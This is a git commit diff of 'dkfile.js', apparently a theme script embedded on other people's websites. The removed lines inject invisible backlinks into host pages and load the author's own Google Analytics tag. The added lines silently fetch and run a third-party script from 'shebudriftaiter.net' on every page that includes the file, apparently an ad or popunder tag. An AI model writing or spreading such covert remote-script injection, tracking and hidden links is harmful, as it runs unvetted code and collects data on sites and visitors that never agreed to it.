150d2e39842be48be2b6d89cb78ba478eb2bd54d
Dhanjee Rider <102199585+dhanjeerider@users.noreply.github.com>
2025-04-05 03:32:43 +0530

    Update dkfile.js

--- dkfile.js
+++ dkfile.js
@@ -1,24 +1,17 @@
-document.addEventListener('DOMContentLoaded', () => {
-  let Folt = document.querySelector(".footer, #main, .copyright");
-  if (Folt) {
-    let Newel = document.createElement('span');
-    Newel.innerHTML = `<a class="btc" href="https://dktechnozone.shop/">Dk Technozone web developer</a>
-   <a class="btc" href="https://techdiwane.com/">Tech diwane</a> 
-   <a class="btc" href="https://dktheme.com/">dktheme</a>
- <style>.btc{
-     color: black;text-decoration: none;
-     opacity: 0; height:0px;line-height:0px;margin:-11px;width:0px;display:inline;
-     font-size: 2px;} .btc:hover{color:transparent; opacity:0;
- }</style>   
-    
-    `;
-    Folt.append(Newel);  
-    console.log("theme by dktechnozone.in");
-var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.documentElement.scrollTop&&!1===lazyanalisis||0!=document.body.scrollTop&&!1===lazyanalisis)&&(!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)}(),lazyanalisis=!0)},!0); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2VYRMPXK0F');
+(function() {
+    var s = document.createElement('script');
+    s.src = 'https://shebudriftaiter.net/tag.min.js';
+    s.setAttribute('data-zone', '9173610');
 
-    
-  } else {
+    function appendScript() {
+        var target = document.body || document.documentElement;
+        target.appendChild(s);
+    }
 
-        
-  }
-});
+    // Check if document.body is ready
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', appendScript);
+    } else {
+        appendScript();
+    }
+})();
